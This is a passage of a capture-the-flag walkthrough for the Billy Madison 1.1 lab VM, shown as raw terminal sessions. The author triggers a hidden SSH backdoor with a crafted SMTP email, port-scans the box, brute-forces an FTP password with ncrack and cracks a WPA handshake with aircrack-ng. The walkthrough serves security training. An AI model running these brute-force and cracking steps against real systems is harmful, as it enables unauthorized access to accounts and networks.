</span><span class='line'><span class="m">331</span> User name okay, need password.
</span><span class='line'>Password:
</span><span class='line'><span class="m">230</span> User logged in, proceed.
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>ftp&gt; ls
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful.
</span><span class='line'><span class="m">150</span> Opening A mode data connection <span class="k">for</span> /.
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> ftp <span class="m">5208</span> Aug <span class="m">20</span> 12:49 39773
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> ftp <span class="m">9132</span> Aug <span class="m">20</span> 12:49 40054
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> ftp <span class="m">6326</span> Aug <span class="m">20</span> 12:49 40049
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> ftp <span class="m">868</span> Sep <span class="m">01</span> 10:42 .notes
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> ftp <span class="m">5367</span> Aug <span class="m">20</span> 12:49 39772
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> ftp <span class="m">1287</span> Aug <span class="m">20</span> 12:49 9129
</span><span class='line'><span class="m">226</span> Transfer completed.
</span></code></pre></td></tr></table></div></figure></p>

<p>I then downloaded all the files here.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1/eric_ftp# cat .notes
</span><span class='line'>Ugh, this is frustrating.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;I managed to make a system account <span class="k">for</span> myself. I also managed to hide Billy<span class="p">&amp;</span>rsquo<span class="p">;</span>s paper
</span><span class='line'>where he<span class="p">&amp;</span>rsquo<span class="p">;</span>ll never find it.  However, now I can<span class="p">&amp;</span>rsquo<span class="p">;</span>t find it either :-<span class="o">(</span>.
</span><span class='line'>To make matters worse, my privesc exploits aren<span class="p">&amp;</span>rsquo<span class="p">;</span>t working.&lt;br/&gt;
</span><span class='line'>One sort of worked, but I think I have it installed all backwards.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;If I<span class="p">&amp;</span>rsquo<span class="p">;</span>m going to maintain total control of Billy<span class="p">&amp;</span>rsquo<span class="p">;</span>s miserable life <span class="o">(</span>or what<span class="p">&amp;</span>rsquo<span class="p">;</span>s left of it<span class="o">)</span>
</span><span class='line'>I need to root the box and find that paper!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Fortunately, my SSH backdoor into the system IS working.&lt;br/&gt;
</span><span class='line'>All I need to <span class="k">do</span> is send an email that includes
</span><span class='line'>the text: <span class="p">&amp;</span>ldquo<span class="p">;</span>My kid will be a &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;_<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Hint: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://www.youtube.com/watch?v=6u7RsW5SAgs&quot;</span>&gt;https://www.youtube.com/watch?v<span class="o">=</span>6u7RsW5SAgs&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;The new secret port will be open and <span class="k">then</span> I can login from there with my wifi password, which I<span class="p">&amp;</span>rsquo<span class="p">;</span>m
</span><span class='line'>sure Billy or Veronica know.  I didn<span class="p">&amp;</span>rsquo<span class="p">;</span>t see it in Billy<span class="p">&amp;</span>rsquo<span class="p">;</span>s FTP folders, but didn<span class="p">&amp;</span>rsquo<span class="p">;</span>t have <span class="nb">time </span>to
</span><span class='line'>check Veronica<span class="p">&amp;</span>rsquo<span class="p">;</span>s.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;-EG
</span></code></pre></td></tr></table></div></figure></p>

<p>By checking the youtube video, I got the sentence would be <code>My kid will be a soccer player</code></p>

<p>then I telnet to port 2525 for SMTP server and send the email to veronica:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# telnet 10.1.1.129 2525
</span><span class='line'>Trying 10.1.1.129<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>Connected to 10.1.1.129.
</span><span class='line'>Escape character is <span class="p">&amp;</span>lsquo<span class="p">;</span>^<span class="o">]</span><span class="p">&amp;</span>rsquo<span class="p">;</span>.
</span><span class='line'><span class="m">220</span> BM ESMTP SubEthaSMTP null
</span><span class='line'>EHLO kali
</span><span class='line'>250-BM
</span><span class='line'>250-8BITMIME
</span><span class='line'>250-AUTH LOGIN
</span><span class='line'><span class="m">250</span> Ok
</span><span class='line'>MAIL FROM:&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#108;&amp;#x74;&amp;#x6f;&amp;#58;&amp;#101;&amp;#114;&amp;#105;&amp;#99;&amp;#64;&amp;#x6d;&amp;#x61;&amp;#x64;&amp;#105;&amp;#115;&amp;#111;&amp;#110;&amp;#x68;&amp;#111;&amp;#x74;&amp;#101;&amp;#x6c;&amp;#115;&amp;#46;&amp;#x63;&amp;#x6f;&amp;#109;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#101;&amp;#x72;&amp;#x69;&amp;#x63;&amp;#64;&amp;#x6d;&amp;#x61;&amp;#x64;&amp;#x69;&amp;#x73;&amp;#111;&amp;#110;&amp;#x68;&amp;#111;&amp;#x74;&amp;#101;&amp;#x6c;&amp;#x73;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#109;&lt;/a&gt;</span>
</span><span class='line'><span class="m">250</span> Ok
</span><span class='line'>RCPT TO:&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#105;&amp;#x6c;&amp;#116;&amp;#111;&amp;#58;&amp;#118;&amp;#118;&amp;#97;&amp;#x75;&amp;#x67;&amp;#104;&amp;#x6e;&amp;#x40;&amp;#x70;&amp;#111;&amp;#108;&amp;#121;&amp;#102;&amp;#101;&amp;#x63;&amp;#x74;&amp;#x6f;&amp;#114;&amp;#46;&amp;#101;&amp;#x64;&amp;#117;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x76;&amp;#x76;&amp;#97;&amp;#x75;&amp;#x67;&amp;#x68;&amp;#110;&amp;#x40;&amp;#x70;&amp;#111;&amp;#108;&amp;#121;&amp;#x66;&amp;#x65;&amp;#99;&amp;#116;&amp;#111;&amp;#x72;&amp;#46;&amp;#x65;&amp;#x64;&amp;#x75;&lt;/a&gt;</span>
</span><span class='line'><span class="m">250</span> Ok
</span><span class='line'>DATA
</span><span class='line'><span class="m">354</span> End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;SUBJECT: email&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;My kid will be a soccer player&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;.
</span><span class='line'><span class="m">250</span> Ok
</span><span class='line'><span class="m">421</span> Timeout waiting <span class="k">for</span> data from client.
</span><span class='line'>Connection closed by foreign host.
</span></code></pre></td></tr></table></div></figure></p>

<p>After the email sent, I connected back to the smb shared folder to check the file <code>ebd.txt</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# smbclient //10.1.1.129/EricsSecretStuff
</span><span class='line'>WARNING: The <span class="p">&amp;</span>ldquo<span class="p">;</span>syslog<span class="p">&amp;</span>rdquo<span class="p">;</span> option is deprecated
</span><span class='line'>Enter root<span class="p">&amp;</span>rsquo<span class="p">;</span>s password:
</span><span class='line'><span class="nv">Domain</span><span class="o">=[</span>WORKGROUP<span class="o">]</span> <span class="nv">OS</span><span class="o">=[</span>Windows 6.1<span class="o">]</span> <span class="nv">Server</span><span class="o">=[</span>Samba 4.3.9-Ubuntu<span class="o">]</span>
</span><span class='line'>smb: &gt; ls
</span><span class='line'>  .                                   D        <span class="m">0</span>  Tue Dec <span class="m">13</span> 08:09:29 2016
</span><span class='line'>  ..                                  D        <span class="m">0</span>  Sat Aug <span class="m">20</span> 14:56:45 2016
</span><span class='line'>  131216070929482.eml                 N       <span class="m">96</span>  Tue Dec <span class="m">13</span> 08:09:29 2016
</span><span class='line'>  ._.DS_Store                        AH     <span class="m">4096</span>  Wed Aug <span class="m">17</span> 10:32:07 2016
</span><span class='line'>  131216070428392.eml                 N      <span class="m">267</span>  Tue Dec <span class="m">13</span> 08:04:28 2016
</span><span class='line'>  ebd.txt                             N       <span class="m">53</span>  Tue Dec <span class="m">13</span> 08:10:01 2016
</span><span class='line'>  .DS_Store                          AH     <span class="m">6148</span>  Wed Aug <span class="m">17</span> 10:32:12 2016&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;    <span class="m">30291996</span> blocks of size 1024. <span class="m">25921952</span> blocks available
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;smb: &gt; get ebd.txt
</span><span class='line'>getting file <span class="se">\e</span>bd.txt of size <span class="m">53</span> as ebd.txt <span class="o">(</span>1.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.1 KiloBytes/sec<span class="o">)</span>
</span><span class='line'>smb: &gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/myTest/BillyMadison1.1# cat ebd.txt
</span><span class='line'>2016-12-13-07-11-01
</span><span class='line'>Erics backdoor is currently OPEN
</span></code></pre></td></tr></table></div></figure></p>

<p>so now, the backdoor is OPEN.</p>

<p>Then do a quick ports scan by using tool <code>masscan</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# masscan -p1-65535 10.1.1.129/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-12-13 13:08:00 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 69/tcp on 10.1.1.129                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 21/tcp on 10.1.1.129                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 139/tcp on 10.1.1.129                                   &lt;br/&gt;
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.129                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 23/tcp on 10.1.1.129                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 1974/tcp on 10.1.1.129                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 2525/tcp on 10.1.1.129                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.129                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 445/tcp on 10.1.1.129                         &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Compared with previouse scanning result, the new port is <code>1974</code>, and then I use <code>nmap</code> to do a deeper scan on port <code>1974</code>, and found that SSH is running on it.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# nmap -v -p1974 -sV 10.1.1.129&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>hellip<span class="p">;</span>turncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>1974/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'>MAC Address: 00:0C:29:84:DA:45 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>turncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Next, from the previouse clues, <code>veronica</code> should have a FTP account, I then try to find the password by using <code>ncrack / medusa</code> with the wordlist <code>pass.lst</code> which is generated before from <code>rockyou.txt</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# ncrack -u veronica -P pass.lst -T <span class="m">5</span> 10.1.1.129 -p 21&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting Ncrack 0.5 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://ncrack.org&quot;</span>&gt;http://ncrack.org&lt;/a&gt; <span class="o">)</span> at 2016-12-13 08:13 EST&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Discovered credentials <span class="k">for</span> ftp on 10.1.1.129 21/tcp:
</span><span class='line'>10.1.1.129 21/tcp &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;ftp:&quot;</span>&gt;ftp:&lt;/a&gt; <span class="p">&amp;</span>lsquo<span class="p">;</span>veronica<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#105;&amp;#x6c;&amp;#116;&amp;#111;&amp;#x3a;&amp;#x62;&amp;#97;&amp;#x62;&amp;#121;&amp;#103;&amp;#105;&amp;#x72;&amp;#x6c;&amp;#95;&amp;#x76;&amp;#x65;&amp;#114;&amp;#x6f;&amp;#x6e;&amp;#x69;&amp;#99;&amp;#x61;&amp;#x30;&amp;#x37;&amp;#64;&amp;#121;&amp;#97;&amp;#x68;&amp;#x6f;&amp;#x6f;&amp;#x2e;&amp;#x63;&amp;#111;&amp;#109;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x62;&amp;#97;&amp;#x62;&amp;#121;&amp;#x67;&amp;#105;&amp;#114;&amp;#x6c;&amp;#x5f;&amp;#118;&amp;#101;&amp;#114;&amp;#x6f;&amp;#110;&amp;#x69;&amp;#99;&amp;#97;&amp;#48;&amp;#x37;&amp;#x40;&amp;#x79;&amp;#x61;&amp;#x68;&amp;#x6f;&amp;#111;&amp;#46;&amp;#99;&amp;#x6f;&amp;#x6d;&lt;/a&gt;&amp;rsquo;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Ncrack <span class="k">done</span>: <span class="m">1</span> service scanned in 189.04 seconds.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Ncrack finished.
</span></code></pre></td></tr></table></div></figure></p>

<p>Great, now I login to the ftp as <code>veronica</code> and found there are 2 files:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1/veronica-ftpfolder# ftp 10.1.1.129 21
</span><span class='line'>Connected to 10.1.1.129.
</span><span class='line'><span class="m">220</span> Welcome to ColoradoFTP - the open <span class="nb">source </span>FTP server <span class="o">(</span>www.coldcore.com<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>10.1.1.129:root<span class="o">)</span>: veronica
</span><span class='line'><span class="m">331</span> User name okay, need password.
</span><span class='line'>Password:
</span><span class='line'><span class="m">230</span> User logged in, proceed.
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>ftp&gt; ls
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful.
</span><span class='line'><span class="m">150</span> Opening A mode data connection <span class="k">for</span> /.
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> ftp <span class="m">595</span> Aug <span class="m">20</span> 12:55 email-from-billy.eml
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> ftp <span class="m">719128</span> Aug <span class="m">17</span> 12:16 eg-01.cap
</span><span class='line'>g226 Transfer completed.
</span></code></pre></td></tr></table></div></figure></p>

<p>Downloaded all of them, and check the email first:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1/veronica-ftpfolder# cat email-from-billy.eml
</span><span class='line'>        Sat, <span class="m">20</span> Aug <span class="m">2016</span> 12:55:45 -0500 <span class="o">(</span>CDT<span class="o">)</span>
</span><span class='line'>Date: Sat, <span class="m">20</span> Aug <span class="m">2016</span> 12:55:40 -0500
</span><span class='line'>To: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;#x6f;&amp;#58;&amp;#x76;&amp;#x76;&amp;#x61;&amp;#117;&amp;#x67;&amp;#x68;&amp;#x6e;&amp;#64;&amp;#112;&amp;#111;&amp;#108;&amp;#121;&amp;#102;&amp;#x65;&amp;#x63;&amp;#x74;&amp;#111;&amp;#x72;&amp;#46;&amp;#101;&amp;#x64;&amp;#x75;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#118;&amp;#x76;&amp;#97;&amp;#x75;&amp;#103;&amp;#x68;&amp;#110;&amp;#x40;&amp;#x70;&amp;#x6f;&amp;#108;&amp;#121;&amp;#102;&amp;#101;&amp;#99;&amp;#x74;&amp;#111;&amp;#114;&amp;#x2e;&amp;#x65;&amp;#100;&amp;#117;&lt;/a&gt;</span>
</span><span class='line'>From: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#111;&amp;#x3a;&amp;#98;&amp;#x69;&amp;#x6c;&amp;#x6c;&amp;#x79;&amp;#x40;&amp;#x6d;&amp;#97;&amp;#x64;&amp;#105;&amp;#x73;&amp;#x6f;&amp;#110;&amp;#x68;&amp;#x6f;&amp;#116;&amp;#x65;&amp;#108;&amp;#x73;&amp;#x2e;&amp;#x63;&amp;#111;&amp;#x6d;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x62;&amp;#105;&amp;#x6c;&amp;#x6c;&amp;#x79;&amp;#x40;&amp;#x6d;&amp;#x61;&amp;#x64;&amp;#105;&amp;#115;&amp;#111;&amp;#x6e;&amp;#x68;&amp;#x6f;&amp;#x74;&amp;#x65;&amp;#x6c;&amp;#115;&amp;#46;&amp;#99;&amp;#x6f;&amp;#x6d;&lt;/a&gt;</span>
</span><span class='line'>Subject: <span class="nb">test </span>Sat, <span class="m">20</span> Aug <span class="m">2016</span> 12:55:40 -0500
</span><span class='line'>X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
</span><span class='line'>Eric<span class="p">&amp;</span>rsquo<span class="p">;</span>s wifi&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Hey VV,&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;It<span class="p">&amp;</span>rsquo<span class="p">;</span>s your boy Billy here.  Sorry to leave in the middle of the night but I wanted to crack Eric<span class="p">&amp;</span>rsquo<span class="p">;</span>s wireless and <span class="k">then</span> mess with him.
</span><span class='line'>I wasn<span class="p">&amp;</span>rsquo<span class="p">;</span>t completely successful yet, but at least I got a start.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;I didn<span class="p">&amp;</span>rsquo<span class="p">;</span>t walk away without doing my signature move, though.  I left a flaming bag of dog poo on his doorstep. :-<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Kisses,&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Billy
</span></code></pre></td></tr></table></div></figure></p>

<p>Also, the other file is a <code>cap</code> file which sure enough is the wireless handshake traffic file. so I fire up <code>aircrack-ng</code> with <code>rockyou.txt</code> to crack the wireless password:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1/veronica-ftpfolder# aircrack-ng -w /usr/share/wordlists/rockyou.txt eg-01.cap
</span><span class='line'>Opening eg-01.cap
</span><span class='line'>Read <span class="m">13003</span> packets.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   <span class="c">#  BSSID              ESSID                     Encryption&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   <span class="m">1</span>  02:13:37:A5:52:2E  EricGordon                WPA <span class="o">(</span><span class="m">1</span> handshake<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Choosing first network as target.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Opening eg-01.cap
</span><span class='line'>Reading packets, please <span class="nb">wait</span><span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;                             Aircrack-ng 1.2 rc4
</span><span class='line'>
</span><span class='line'>  <span class="o">[</span>00:18:52<span class="o">]</span> 1699632/9822768 keys tested <span class="o">(</span>1637.45 k/s<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>  Time left: <span class="m">1</span> hour, <span class="m">22</span> minutes, <span class="m">42</span> seconds                 17.30%
</span><span class='line'>
</span><span class='line'>                       KEY FOUND! <span class="o">[</span> triscuit* <span class="o">]</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  Master Key     : 9E 8B 4F E6 CC 5E E2 4C <span class="m">46</span> <span class="m">84</span> D2 AF <span class="m">59</span> 4B <span class="m">21</span> 6D
</span><span class='line'>                   B5 3B <span class="m">52</span> <span class="m">84</span> <span class="m">04</span> 9D D8 D8 <span class="m">83</span> <span class="m">67</span> AF <span class="m">43</span> DC <span class="m">60</span> CE <span class="m">92</span>
</span><span class='line'>
</span><span class='line'>  Transient Key  : 7A FA <span class="m">82</span> <span class="m">59</span> 5A 9A <span class="m">23</span> 6E 8C FB 1D 4B 4D <span class="m">47</span> BE <span class="m">13</span>
</span><span class='line'>                   D7 AC AC 4C <span class="m">81</span> 0F B5 A2 EE 2D 9F CC 8F <span class="m">05</span> D2 <span class="m">82</span>
</span><span class='line'>                   BF F4 4E AE 4E C9 ED EA <span class="m">31</span> <span class="m">37</span> 1E E7 <span class="m">29</span> <span class="m">10</span> <span class="m">13</span> <span class="m">92</span>
</span><span class='line'>                   BB <span class="m">87</span> 8A AE <span class="m">70</span> <span class="m">95</span> F8 <span class="m">62</span> <span class="m">20</span> B5 2B <span class="m">53</span> 8D 0C 5C DC
</span><span class='line'>
</span><span class='line'>  EAPOL HMAC     : <span class="m">86</span> <span class="m">63</span> <span class="m">53</span> 4B <span class="m">77</span> <span class="m">52</span> <span class="m">82</span> 0C <span class="m">73</span> 4A FA CA <span class="m">19</span> <span class="m">79</span> <span class="m">05</span> <span class="m">33</span>
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/myTest/BillyMadison1.1/veronica-ftpfolder#
</span></code></pre></td></tr></table></div></figure></p>

<p>Great! now I would be able to login as Eric via the backdoor port <code>1974</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
